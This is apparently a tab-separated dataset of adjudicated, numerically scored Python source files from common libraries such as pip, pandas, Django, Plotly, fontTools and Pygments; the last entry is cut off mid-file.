496	adjudicated	4	"# Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># Default TEST_CONFIG_OVERRIDE for python repos.<<NEWL>><<NEWL>># You can copy this file into your directory, then it will be imported from<<NEWL>># the noxfile.py.<<NEWL>><<NEWL>># The source of truth:<<NEWL>># https://github.com/GoogleCloudPlatform/python-docs-samples/blob/main/noxfile_config.py<<NEWL>><<NEWL>>TEST_CONFIG_OVERRIDE = {<<NEWL>>    # You can opt out from the test for specific Python versions.<<NEWL>>    ""ignored_versions"": [""2.7"", ""3.6"", ""3.9"", ""3.10"", ""3.11""],<<NEWL>>    # Old samples are opted out of enforcing Python type hints<<NEWL>>    # All new samples should feature them<<NEWL>>    ""enforce_type_hints"": False,<<NEWL>>    # An envvar key for determining the project id to use. Change it<<NEWL>>    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a<<NEWL>>    # build specific Cloud project. You can also use your own string<<NEWL>>    # to use your own Cloud project.<<NEWL>>    ""gcloud_project_env"": ""GOOGLE_CLOUD_PROJECT"",<<NEWL>>    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',<<NEWL>>    # If you need to use a specific version of pip,<<NEWL>>    # change pip_version_override to the string representation<<NEWL>>    # of the version number, for example, ""20.2.4""<<NEWL>>    ""pip_version_override"": None,<<NEWL>>    # A dictionary you want to inject into your test. Don't put any<<NEWL>>    # secrets here. These values will override predefined values.<<NEWL>>    ""envs"": {},<<NEWL>>}"
465	adjudicated	0	"# Copyright (c) Meta Platforms, Inc. and affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>><<NEWL>>import dataclasses<<NEWL>><<NEWL>>from textwrap import dedent<<NEWL>><<NEWL>>import viktor._vendor.libcst as cst<<NEWL>>from viktor._vendor.libcst.metadata import AccessorProvider, MetadataWrapper<<NEWL>>from viktor._vendor.libcst.testing.utils import data_provider, UnitTest<<NEWL>><<NEWL>><<NEWL>>class DependentVisitor(cst.CSTVisitor):<<NEWL>>    METADATA_DEPENDENCIES = (AccessorProvider,)<<NEWL>><<NEWL>>    def __init__(self, *, test: UnitTest) -> None:<<NEWL>>        self.test = test<<NEWL>><<NEWL>>    def on_visit(self, node: cst.CSTNode) -> bool:<<NEWL>>        for f in dataclasses.fields(node):<<NEWL>>            child = getattr(node, f.name)<<NEWL>>            if type(child) is cst.CSTNode:<<NEWL>>                accessor = self.get_metadata(AccessorProvider, child)<<NEWL>>                self.test.assertEqual(accessor, f.name)<<NEWL>><<NEWL>>        return True<<NEWL>><<NEWL>><<NEWL>>class AccessorProviderTest(UnitTest):<<NEWL>>    @data_provider(<<NEWL>>        (<<NEWL>>            (<<NEWL>>                """"""<<NEWL>>                foo = 'toplevel'<<NEWL>>                fn1(foo)<<NEWL>>                fn2(foo)<<NEWL>>                def fn_def():<<NEWL>>                    foo = 'shadow'<<NEWL>>                    fn3(foo)<<NEWL>>                """""",<<NEWL>>            ),<<NEWL>>            (<<NEWL>>                """"""<<NEWL>>                global_var = None<<NEWL>>                @cls_attr<<NEWL>>                class Cls(cls_attr, kwarg=cls_attr):<<NEWL>>                    cls_attr = 5<<NEWL>>                    def f():<<NEWL>>                        pass<<NEWL>>                """""",<<NEWL>>            ),<<NEWL>>            (<<NEWL>>                """"""<<NEWL>>                iterator = None<<NEWL>>                condition = None<<NEWL>>                [elt for target in iterator if condition]<<NEWL>>                {elt for target in iterator if condition}<<NEWL>>                {elt: target for target in iterator if condition}<<NEWL>>                (elt for target in iterator if condition)<<NEWL>>                """""",<<NEWL>>            ),<<NEWL>>        )<<NEWL>>    )<<NEWL>>    def test_accessor_provier(self, code: str) -> None:<<NEWL>>        wrapper = MetadataWrapper(cst.parse_module(dedent(code)))<<NEWL>>        wrapper.visit(DependentVisitor(test=self))"
434	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = ""d F Y""  # 25 Ottobre 2006<<NEWL>>TIME_FORMAT = ""H:i""  # 14:30<<NEWL>>DATETIME_FORMAT = ""l d F Y H:i""  # Mercoledì 25 Ottobre 2006 14:30<<NEWL>>YEAR_MONTH_FORMAT = ""F Y""  # Ottobre 2006<<NEWL>>MONTH_DAY_FORMAT = ""j F""  # 25 Ottobre<<NEWL>>SHORT_DATE_FORMAT = ""d/m/Y""  # 25/12/2009<<NEWL>>SHORT_DATETIME_FORMAT = ""d/m/Y H:i""  # 25/10/2009 14:30<<NEWL>>FIRST_DAY_OF_WEEK = 1  # Lunedì<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    ""%d/%m/%Y"",  # '25/10/2006'<<NEWL>>    ""%Y/%m/%d"",  # '2006/10/25'<<NEWL>>    ""%d-%m-%Y"",  # '25-10-2006'<<NEWL>>    ""%Y-%m-%d"",  # '2006-10-25'<<NEWL>>    ""%d-%m-%y"",  # '25-10-06'<<NEWL>>    ""%d/%m/%y"",  # '25/10/06'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    ""%d/%m/%Y %H:%M:%S"",  # '25/10/2006 14:30:59'<<NEWL>>    ""%d/%m/%Y %H:%M:%S.%f"",  # '25/10/2006 14:30:59.000200'<<NEWL>>    ""%d/%m/%Y %H:%M"",  # '25/10/2006 14:30'<<NEWL>>    ""%d/%m/%y %H:%M:%S"",  # '25/10/06 14:30:59'<<NEWL>>    ""%d/%m/%y %H:%M:%S.%f"",  # '25/10/06 14:30:59.000200'<<NEWL>>    ""%d/%m/%y %H:%M"",  # '25/10/06 14:30'<<NEWL>>    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'<<NEWL>>    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'<<NEWL>>    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'<<NEWL>>    ""%d-%m-%Y %H:%M:%S"",  # '25-10-2006 14:30:59'<<NEWL>>    ""%d-%m-%Y %H:%M:%S.%f"",  # '25-10-2006 14:30:59.000200'<<NEWL>>    ""%d-%m-%Y %H:%M"",  # '25-10-2006 14:30'<<NEWL>>    ""%d-%m-%y %H:%M:%S"",  # '25-10-06 14:30:59'<<NEWL>>    ""%d-%m-%y %H:%M:%S.%f"",  # '25-10-06 14:30:59.000200'<<NEWL>>    ""%d-%m-%y %H:%M"",  # '25-10-06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = "",""<<NEWL>>THOUSAND_SEPARATOR = "".""<<NEWL>>NUMBER_GROUPING = 3"
400	adjudicated	4	"""""""Stuff that differs in different Python versions and platform<<NEWL>>distributions.""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import os<<NEWL>>import sys<<NEWL>><<NEWL>>__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]<<NEWL>><<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def has_tls() -> bool:<<NEWL>>    try:<<NEWL>>        import _ssl  # noqa: F401  # ignore unused<<NEWL>><<NEWL>>        return True<<NEWL>>    except ImportError:<<NEWL>>        pass<<NEWL>><<NEWL>>    from pip._vendor.urllib3.util import IS_PYOPENSSL<<NEWL>><<NEWL>>    return IS_PYOPENSSL<<NEWL>><<NEWL>><<NEWL>>def get_path_uid(path: str) -> int:<<NEWL>>    """"""<<NEWL>>    Return path's uid.<<NEWL>><<NEWL>>    Does not follow symlinks:<<NEWL>>        https://github.com/pypa/pip/pull/935#discussion_r5307003<<NEWL>><<NEWL>>    Placed this function in compat due to differences on AIX and<<NEWL>>    Jython, that should eventually go away.<<NEWL>><<NEWL>>    :raises OSError: When path is a symlink or can't be read.<<NEWL>>    """"""<<NEWL>>    if hasattr(os, ""O_NOFOLLOW""):<<NEWL>>        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)<<NEWL>>        file_uid = os.fstat(fd).st_uid<<NEWL>>        os.close(fd)<<NEWL>>    else:  # AIX and Jython<<NEWL>>        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW<<NEWL>>        if not os.path.islink(path):<<NEWL>>            # older versions of Jython don't have `os.fstat`<<NEWL>>            file_uid = os.stat(path).st_uid<<NEWL>>        else:<<NEWL>>            # raise OSError for parity with os.O_NOFOLLOW above<<NEWL>>            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")<<NEWL>>    return file_uid<<NEWL>><<NEWL>><<NEWL>># packages in the stdlib that may have installation metadata, but should not be<<NEWL>># considered 'installed'.  this theoretically could be determined based on<<NEWL>># dist.location (py27:`sysconfig.get_paths()['stdlib']`,<<NEWL>># py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may<<NEWL>># make this ineffective, so hard-coding<<NEWL>>stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}<<NEWL>><<NEWL>><<NEWL>># windows detection, covers cpython and ironpython<<NEWL>>WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
451	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""contour"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
511	adjudicated	3	"#!/usr/bin/env python3<<NEWL>>""""""Session authentication with expiration<<NEWL>>and storage support module for the API.<<NEWL>>""""""<<NEWL>>from flask import request<<NEWL>>from datetime import datetime, timedelta<<NEWL>><<NEWL>>from models.user_session import UserSession<<NEWL>>from .session_exp_auth import SessionExpAuth<<NEWL>><<NEWL>><<NEWL>>class SessionDBAuth(SessionExpAuth):<<NEWL>>    """"""Session authentication class with expiration and storage support.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def create_session(self, user_id=None) -> str:<<NEWL>>        """"""Creates and stores a session id for the user.<<NEWL>>        """"""<<NEWL>>        session_id = super().create_session(user_id)<<NEWL>>        if type(session_id) == str:<<NEWL>>            kwargs = {<<NEWL>>                'user_id': user_id,<<NEWL>>                'session_id': session_id,<<NEWL>>            }<<NEWL>>            user_session = UserSession(**kwargs)<<NEWL>>            user_session.save()<<NEWL>>            return session_id<<NEWL>><<NEWL>>    def user_id_for_session_id(self, session_id=None):<<NEWL>>        """"""Retrieves the user id of the user associated with<<NEWL>>        a given session id.<<NEWL>>        """"""<<NEWL>>        try:<<NEWL>>            sessions = UserSession.search({'session_id': session_id})<<NEWL>>        except Exception:<<NEWL>>            return None<<NEWL>>        if len(sessions) <= 0:<<NEWL>>            return None<<NEWL>>        cur_time = datetime.now()<<NEWL>>        time_span = timedelta(seconds=self.session_duration)<<NEWL>>        exp_time = sessions[0].created_at + time_span<<NEWL>>        if exp_time < cur_time:<<NEWL>>            return None<<NEWL>>        return sessions[0].user_id<<NEWL>><<NEWL>>    def destroy_session(self, request=None) -> bool:<<NEWL>>        """"""Destroys an authenticated session.<<NEWL>>        """"""<<NEWL>>        session_id = self.session_cookie(request)<<NEWL>>        try:<<NEWL>>            sessions = UserSession.search({'session_id': session_id})<<NEWL>>        except Exception:<<NEWL>>            return False<<NEWL>>        if len(sessions) <= 0:<<NEWL>>            return False<<NEWL>>        sessions[0].remove()<<NEWL>>        return True"
500	adjudicated	3	from MySQLdb.constants import FIELD_TYPE<<NEWL>><<NEWL>>from django.contrib.gis.gdal import OGRGeomType<<NEWL>>from django.db.backends.mysql.introspection import DatabaseIntrospection<<NEWL>><<NEWL>><<NEWL>>class MySQLIntrospection(DatabaseIntrospection):<<NEWL>>    # Updating the data_types_reverse dictionary with the appropriate<<NEWL>>    # type for Geometry fields.<<NEWL>>    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()<<NEWL>>    data_types_reverse[FIELD_TYPE.GEOMETRY] = 'GeometryField'<<NEWL>><<NEWL>>    def get_geometry_type(self, table_name, description):<<NEWL>>        with self.connection.cursor() as cursor:<<NEWL>>            # In order to get the specific geometry type of the field,<<NEWL>>            # we introspect on the table definition using `DESCRIBE`.<<NEWL>>            cursor.execute('DESCRIBE %s' %<<NEWL>>                           self.connection.ops.quote_name(table_name))<<NEWL>>            # Increment over description info until we get to the geometry<<NEWL>>            # column.<<NEWL>>            for column, typ, null, key, default, extra in cursor.fetchall():<<NEWL>>                if column == description.name:<<NEWL>>                    # Using OGRGeomType to convert from OGC name to Django field.<<NEWL>>                    # MySQL does not support 3D or SRIDs, so the field params<<NEWL>>                    # are empty.<<NEWL>>                    field_type = OGRGeomType(typ).django<<NEWL>>                    field_params = {}<<NEWL>>                    break<<NEWL>>        return field_type, field_params<<NEWL>><<NEWL>>    def supports_spatial_index(self, cursor, table_name):<<NEWL>>        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB 10.2.2+<<NEWL>>        storage_engine = self.get_storage_engine(cursor, table_name)<<NEWL>>        if storage_engine == 'InnoDB':<<NEWL>>            return self.connection.mysql_version >= (<<NEWL>>                (10, 2, 2) if self.connection.mysql_is_mariadb else (5, 7, 5)<<NEWL>>            )<<NEWL>>        return storage_engine in ('MyISAM', 'Aria')
440	adjudicated	3	"from typing import List, Optional<<NEWL>><<NEWL>>from .base import BaseDistribution, BaseEnvironment, FilesystemWheel, MemoryWheel, Wheel<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""BaseDistribution"",<<NEWL>>    ""BaseEnvironment"",<<NEWL>>    ""FilesystemWheel"",<<NEWL>>    ""MemoryWheel"",<<NEWL>>    ""Wheel"",<<NEWL>>    ""get_default_environment"",<<NEWL>>    ""get_environment"",<<NEWL>>    ""get_wheel_distribution"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>def get_default_environment() -> BaseEnvironment:<<NEWL>>    """"""Get the default representation for the current environment.<<NEWL>><<NEWL>>    This returns an Environment instance from the chosen backend. The default<<NEWL>>    Environment instance should be built from ``sys.path`` and may use caching<<NEWL>>    to share instance state accorss calls.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Environment<<NEWL>><<NEWL>>    return Environment.default()<<NEWL>><<NEWL>><<NEWL>>def get_environment(paths: Optional[List[str]]) -> BaseEnvironment:<<NEWL>>    """"""Get a representation of the environment specified by ``paths``.<<NEWL>><<NEWL>>    This returns an Environment instance from the chosen backend based on the<<NEWL>>    given import paths. The backend must build a fresh instance representing<<NEWL>>    the state of installed distributions when this function is called.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Environment<<NEWL>><<NEWL>>    return Environment.from_paths(paths)<<NEWL>><<NEWL>><<NEWL>>def get_directory_distribution(directory: str) -> BaseDistribution:<<NEWL>>    """"""Get the distribution metadata representation in the specified directory.<<NEWL>><<NEWL>>    This returns a Distribution instance from the chosen backend based on<<NEWL>>    the given on-disk ``.dist-info`` directory.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Distribution<<NEWL>><<NEWL>>    return Distribution.from_directory(directory)<<NEWL>><<NEWL>><<NEWL>>def get_wheel_distribution(wheel: Wheel, canonical_name: str) -> BaseDistribution:<<NEWL>>    """"""Get the representation of the specified wheel's distribution metadata.<<NEWL>><<NEWL>>    This returns a Distribution instance from the chosen backend based on<<NEWL>>    the given wheel's ``.dist-info`` directory.<<NEWL>><<NEWL>>    :param canonical_name: Normalized project name of the given wheel.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Distribution<<NEWL>><<NEWL>>    return Distribution.from_wheel(wheel, canonical_name)"
411	adjudicated	0	"from . import DefaultTable<<NEWL>>import sys<<NEWL>>import array<<NEWL>>import logging<<NEWL>><<NEWL>><<NEWL>>log = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>class table__l_o_c_a(DefaultTable.DefaultTable):<<NEWL>><<NEWL>>    dependencies = [""glyf""]<<NEWL>><<NEWL>>    def decompile(self, data, ttFont):<<NEWL>>        longFormat = ttFont[""head""].indexToLocFormat<<NEWL>>        if longFormat:<<NEWL>>            format = ""I""<<NEWL>>        else:<<NEWL>>            format = ""H""<<NEWL>>        locations = array.array(format)<<NEWL>>        locations.frombytes(data)<<NEWL>>        if sys.byteorder != ""big"":<<NEWL>>            locations.byteswap()<<NEWL>>        if not longFormat:<<NEWL>>            l = array.array(""I"")<<NEWL>>            for i in range(len(locations)):<<NEWL>>                l.append(locations[i] * 2)<<NEWL>>            locations = l<<NEWL>>        if len(locations) < (ttFont[""maxp""].numGlyphs + 1):<<NEWL>>            log.warning(<<NEWL>>                ""corrupt 'loca' table, or wrong numGlyphs in 'maxp': %d %d"",<<NEWL>>                len(locations) - 1,<<NEWL>>                ttFont[""maxp""].numGlyphs,<<NEWL>>            )<<NEWL>>        self.locations = locations<<NEWL>><<NEWL>>    def compile(self, ttFont):<<NEWL>>        try:<<NEWL>>            max_location = max(self.locations)<<NEWL>>        except AttributeError:<<NEWL>>            self.set([])<<NEWL>>            max_location = 0<<NEWL>>        if max_location < 0x20000 and all(l % 2 == 0 for l in self.locations):<<NEWL>>            locations = array.array(""H"")<<NEWL>>            for i in range(len(self.locations)):<<NEWL>>                locations.append(self.locations[i] // 2)<<NEWL>>            ttFont[""head""].indexToLocFormat = 0<<NEWL>>        else:<<NEWL>>            locations = array.array(""I"", self.locations)<<NEWL>>            ttFont[""head""].indexToLocFormat = 1<<NEWL>>        if sys.byteorder != ""big"":<<NEWL>>            locations.byteswap()<<NEWL>>        return locations.tobytes()<<NEWL>><<NEWL>>    def set(self, locations):<<NEWL>>        self.locations = array.array(""I"", locations)<<NEWL>><<NEWL>>    def toXML(self, writer, ttFont):<<NEWL>>        writer.comment(""The 'loca' table will be calculated by the compiler"")<<NEWL>>        writer.newline()<<NEWL>><<NEWL>>    def __getitem__(self, index):<<NEWL>>        return self.locations[index]<<NEWL>><<NEWL>>    def __len__(self):<<NEWL>>        return len(self.locations)"
425	adjudicated	1	"from datetime import (<<NEWL>>    datetime,<<NEWL>>    timedelta,<<NEWL>>)<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    DatetimeIndex,<<NEWL>>    NaT,<<NEWL>>    Timestamp,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>def test_unique(tz_naive_fixture):<<NEWL>><<NEWL>>    idx = DatetimeIndex([""2017""] * 2, tz=tz_naive_fixture)<<NEWL>>    expected = idx[:1]<<NEWL>><<NEWL>>    result = idx.unique()<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>>    # GH#21737<<NEWL>>    # Ensure the underlying data is consistent<<NEWL>>    assert result[0] == expected[0]<<NEWL>><<NEWL>><<NEWL>>def test_index_unique(rand_series_with_duplicate_datetimeindex):<<NEWL>>    dups = rand_series_with_duplicate_datetimeindex<<NEWL>>    index = dups.index<<NEWL>><<NEWL>>    uniques = index.unique()<<NEWL>>    expected = DatetimeIndex(<<NEWL>>        [<<NEWL>>            datetime(2000, 1, 2),<<NEWL>>            datetime(2000, 1, 3),<<NEWL>>            datetime(2000, 1, 4),<<NEWL>>            datetime(2000, 1, 5),<<NEWL>>        ]<<NEWL>>    )<<NEWL>>    assert uniques.dtype == ""M8[ns]""  # sanity<<NEWL>>    tm.assert_index_equal(uniques, expected)<<NEWL>>    assert index.nunique() == 4<<NEWL>><<NEWL>>    # GH#2563<<NEWL>>    assert isinstance(uniques, DatetimeIndex)<<NEWL>><<NEWL>>    dups_local = index.tz_localize(""US/Eastern"")<<NEWL>>    dups_local.name = ""foo""<<NEWL>>    result = dups_local.unique()<<NEWL>>    expected = DatetimeIndex(expected, name=""foo"")<<NEWL>>    expected = expected.tz_localize(""US/Eastern"")<<NEWL>>    assert result.tz is not None<<NEWL>>    assert result.name == ""foo""<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>><<NEWL>><<NEWL>>def test_index_unique2():<<NEWL>>    # NaT, note this is excluded<<NEWL>>    arr = [1370745748 + t for t in range(20)] + [NaT.value]<<NEWL>>    idx = DatetimeIndex(arr * 3)<<NEWL>>    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))<<NEWL>>    assert idx.nunique() == 20<<NEWL>>    assert idx.nunique(dropna=False) == 21<<NEWL>><<NEWL>><<NEWL>>def test_index_unique3():<<NEWL>>    arr = [<<NEWL>>        Timestamp(""2013-06-09 02:42:28"") + timedelta(seconds=t) for t in range(20)<<NEWL>>    ] + [NaT]<<NEWL>>    idx = DatetimeIndex(arr * 3)<<NEWL>>    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))<<NEWL>>    assert idx.nunique() == 20<<NEWL>>    assert idx.nunique(dropna=False) == 21<<NEWL>><<NEWL>><<NEWL>>def test_is_unique_monotonic(rand_series_with_duplicate_datetimeindex):<<NEWL>>    index = rand_series_with_duplicate_datetimeindex.index<<NEWL>>    assert not index.is_unique"
474	adjudicated	1	"# Copyright 2018-present Tellabs, Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>>"""""" Tellabs vendor-specific OMCI Entities""""""<<NEWL>><<NEWL>>import inspect<<NEWL>>import structlog<<NEWL>>import sys<<NEWL>><<NEWL>>from scapy.fields import ShortField, IntField, ByteField, StrFixedLenField<<NEWL>>from voltha.extensions.omci.omci_entities import EntityClassAttribute, \<<NEWL>>    AttributeAccess, OmciNullPointer, EntityOperations, EntityClass<<NEWL>><<NEWL>>log = structlog.get_logger()<<NEWL>><<NEWL>># abbreviations<<NEWL>>ECA = EntityClassAttribute<<NEWL>>AA = AttributeAccess<<NEWL>>OP = EntityOperations<<NEWL>><<NEWL>>#################################################################################<<NEWL>># entity class lookup table from entity_class values<<NEWL>>_onu_entity_classes_name_map = dict(<<NEWL>>    inspect.getmembers(sys.modules[__name__], lambda o:<<NEWL>>    inspect.isclass(o) and issubclass(o, EntityClass) and o is not EntityClass)<<NEWL>>)<<NEWL>>_onu_custom_entity_classes = [c for c in _onu_entity_classes_name_map.itervalues()]<<NEWL>>_onu_custom_entity_id_to_class_map = dict()<<NEWL>><<NEWL>><<NEWL>>def onu_custom_me_entities():<<NEWL>>    log.info('onu_custom_me_entities')<<NEWL>><<NEWL>>    if len(_onu_custom_entity_id_to_class_map) == 0:<<NEWL>>        for entity_class in _onu_custom_entity_classes:<<NEWL>>            log.info('adding-custom-me', class_id=entity_class.class_id)<<NEWL>>            assert entity_class.class_id not in _onu_custom_entity_id_to_class_map, \<<NEWL>>                ""Class ID '{}' already exists in the class map"".format(entity_class.class_id)<<NEWL>>            _onu_custom_entity_id_to_class_map[entity_class.class_id] = entity_class<<NEWL>><<NEWL>>    log.info('onu_custom_me_entities', map=_onu_custom_entity_id_to_class_map)<<NEWL>>    return _onu_custom_entity_id_to_class_map<<NEWL>>"
487	adjudicated	0	"import numpy as np<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    Series,<<NEWL>>    Timestamp,<<NEWL>>    date_range,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>>from pandas.api.types import is_scalar<<NEWL>><<NEWL>><<NEWL>>class TestSeriesSearchSorted:<<NEWL>>    def test_searchsorted(self):<<NEWL>>        ser = Series([1, 2, 3])<<NEWL>><<NEWL>>        result = ser.searchsorted(1, side=""left"")<<NEWL>>        assert is_scalar(result)<<NEWL>>        assert result == 0<<NEWL>><<NEWL>>        result = ser.searchsorted(1, side=""right"")<<NEWL>>        assert is_scalar(result)<<NEWL>>        assert result == 1<<NEWL>><<NEWL>>    def test_searchsorted_numeric_dtypes_scalar(self):<<NEWL>>        ser = Series([1, 2, 90, 1000, 3e9])<<NEWL>>        res = ser.searchsorted(30)<<NEWL>>        assert is_scalar(res)<<NEWL>>        assert res == 2<<NEWL>><<NEWL>>        res = ser.searchsorted([30])<<NEWL>>        exp = np.array([2], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)<<NEWL>><<NEWL>>    def test_searchsorted_numeric_dtypes_vector(self):<<NEWL>>        ser = Series([1, 2, 90, 1000, 3e9])<<NEWL>>        res = ser.searchsorted([91, 2e6])<<NEWL>>        exp = np.array([3, 4], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)<<NEWL>><<NEWL>>    def test_searchsorted_datetime64_scalar(self):<<NEWL>>        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))<<NEWL>>        val = Timestamp(""20120102"")<<NEWL>>        res = ser.searchsorted(val)<<NEWL>>        assert is_scalar(res)<<NEWL>>        assert res == 1<<NEWL>><<NEWL>>    def test_searchsorted_datetime64_scalar_mixed_timezones(self):<<NEWL>>        # GH 30086<<NEWL>>        ser = Series(date_range(""20120101"", periods=10, freq=""2D"", tz=""UTC""))<<NEWL>>        val = Timestamp(""20120102"", tz=""America/New_York"")<<NEWL>>        res = ser.searchsorted(val)<<NEWL>>        assert is_scalar(res)<<NEWL>>        assert res == 1<<NEWL>><<NEWL>>    def test_searchsorted_datetime64_list(self):<<NEWL>>        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))<<NEWL>>        vals = [Timestamp(""20120102""), Timestamp(""20120104"")]<<NEWL>>        res = ser.searchsorted(vals)<<NEWL>>        exp = np.array([1, 2], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)<<NEWL>><<NEWL>>    def test_searchsorted_sorter(self):<<NEWL>>        # GH8490<<NEWL>>        ser = Series([3, 1, 2])<<NEWL>>        res = ser.searchsorted([0, 3], sorter=np.argsort(ser))<<NEWL>>        exp = np.array([0, 2], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)"
398	adjudicated	3	"""""""<<NEWL>>    pygments.styles.vim<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    A highlighting style for Pygments, inspired by vim.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace, Token<<NEWL>><<NEWL>><<NEWL>>class VimStyle(Style):<<NEWL>>    """"""<<NEWL>>    Styles somewhat like vim 7.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = ""#000000""<<NEWL>>    highlight_color = ""#222222""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Token:                     ""#cccccc"",<<NEWL>>        Whitespace:                """",<<NEWL>>        Comment:                   ""#000080"",<<NEWL>>        Comment.Preproc:           """",<<NEWL>>        Comment.Special:           ""bold #cd0000"",<<NEWL>><<NEWL>>        Keyword:                   ""#cdcd00"",<<NEWL>>        Keyword.Declaration:       ""#00cd00"",<<NEWL>>        Keyword.Namespace:         